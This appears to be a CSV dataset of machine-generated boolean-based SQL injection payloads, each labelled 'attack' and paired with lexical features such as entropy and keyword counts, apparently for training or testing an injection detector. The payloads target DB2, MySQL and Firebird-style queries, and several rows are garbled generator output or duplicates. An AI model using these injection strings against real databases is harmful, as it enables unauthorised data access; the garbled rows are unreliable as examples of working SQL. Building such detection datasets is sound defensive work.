label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,12,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"select ch  (  chr  (  select 3455  =  like  (  7272  (  'abcdefg',ct  (  select case 7471  (  109  )   andb  (  1,5000000   )    (2  )   and   (  109  )   from gejfrom i'  =  'i'  =  'ystables as gex  )  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,13,206.0,35.0,3.910570927506206,73.0,27.0,79.0,27.0,0.35436893203883496,0.13106796116504854,0.38349514563106796,0.13106796116504854,6.0,0.0,2.0,0.0,0.0,3.0,0.0,14.0,0.0,0.0,2.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1%""jkfk""%or' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,14,116.0,31.0,3.7899000683452644,40.0,13.0,46.0,17.0,0.3448275862068966,0.11206896551724138,0.39655172413793105,0.14655172413793102,4.0,2.0,0.0,0.0,0.0,2.0,0.0,6.0,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozandaberdomas as t1f",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,15,166.0,30.0,3.8897502902892627,85.0,9.0,55.0,17.0,0.5120481927710844,0.05421686746987952,0.3313253012048193,0.10240963855421686,2.0,0.0,0.0,0.0,1.0,1.0,0.0,8.0,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozandza'  =  'jxpks",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,16,164.0,34.0,3.951413720185059,79.0,8.0,57.0,20.0,0.4817073170731707,0.04878048780487805,0.3475609756097561,0.12195121951219512,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.0,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,17,107.0,27.0,3.5228911686215136,34.0,13.0,46.0,14.0,0.3177570093457944,0.12149532710280374,0.42990654205607476,0.1308411214953271,4.0,0.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ''prz  )   and 7471  =  3902 or mas asios atob  (  crdbverrdb$tysustable(serdbmsas t3  (  char  s  (  1041  =  3814",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,18,187.0,38.0,3.9929627978668885,67.0,30.0,69.0,21.0,0.3582887700534759,0.16042780748663102,0.3689839572192513,0.11229946524064172,3.0,0.0,0.0,0.0,0.0,3.0,0.0,11.0,1.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,5.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,19,135.0,30.0,4.004591100181868,68.0,8.0,41.0,18.0,0.5037037037037037,0.05925925925925926,0.3037037037037037,0.13333333333333333,3.0,0.0,0.0,0.0,1.0,1.0,0.0,6.0,2.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,20,77.0,19.0,2.9161821345357035,9.0,13.0,40.0,15.0,0.11688311688311688,0.16883116883116883,0.5194805194805194,0.19480519480519481,0.0,4.0,0.0,0.0,0.0,2.0,0.0,6.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,select or   (    3020  ,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,21,23.0,12.0,2.905332349584247,8.0,4.0,10.0,1.0,0.34782608695652173,0.17391304347826086,0.43478260869565216,0.043478260869565216,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'||  (  select 'uppr  (  chr  (  r  (  =  9354,5019  (  \.  ,d  (  char  (  110,5  )   or 7427  =  5173 co6975undomaieiesas rrdbmblers as guntat_users as tomains as t1,sysibm.syssibm.systablers i",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,22,196.0,37.0,4.357461570190559,95.0,26.0,52.0,23.0,0.4846938775510204,0.1326530612244898,0.2653061224489796,0.11734693877551021,2.0,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,1.0,4.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.0
attack,1'||  (  select 'llessus 9643  =    (  select count  (  3020  )  --,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,23,67.0,22.0,3.6552553330745585,24.0,9.0,23.0,11.0,0.3582089552238806,0.13432835820895522,0.34328358208955223,0.16417910447761194,2.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,24,138.0,30.0,4.033493657696427,75.0,8.0,37.0,18.0,0.5434782608695652,0.057971014492753624,0.26811594202898553,0.13043478260869565,4.0,0.0,0.0,0.0,1.0,2.0,0.0,4.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,25,141.0,30.0,3.966011091968719,68.0,8.0,45.0,20.0,0.48226950354609927,0.05673758865248227,0.3191489361702128,0.14184397163120568,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%avvpipppppcere_userales mblom.sysagexpssers gke.  ,5127,120,null  )   --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,26,74.0,30.0,4.472921900968891,47.0,8.0,9.0,10.0,0.6351351351351351,0.10810810810810811,0.12162162162162163,0.13513513513513514,0.0,0.0,2.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,3.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%'  )   or 8384  =  like  (  'a5158invinvbppsers gu,boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,27,52.0,25.0,4.0444179116323475,22.0,9.0,15.0,6.0,0.4230769230769231,0.17307692307692307,0.28846153846153844,0.11538461538461539,2.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"select rdb$ftibes5000000pe_m.rables as umesage1,5000000  --",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,28,59.0,24.0,4.06230253383205,33.0,15.0,5.0,6.0,0.559322033898305,0.2542372881355932,0.0847457627118644,0.1016949152542373,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,29,141.0,30.0,3.966011091968719,68.0,8.0,45.0,20.0,0.48226950354609927,0.05673758865248227,0.3191489361702128,0.14184397163120568,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1%'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  '%'  =  '",boolean,boolean,seqgan_improved,seqgan_improved__phase3__boolean__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,30,141.0,30.0,3.966011091968719,68.0,8.0,45.0,20.0,0.48226950354609927,0.05673758865248227,0.3191489361702128,0.14184397163120568,4.0,0.0,0.0,0.0,1.0,2.0,0.0,6.0,2.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
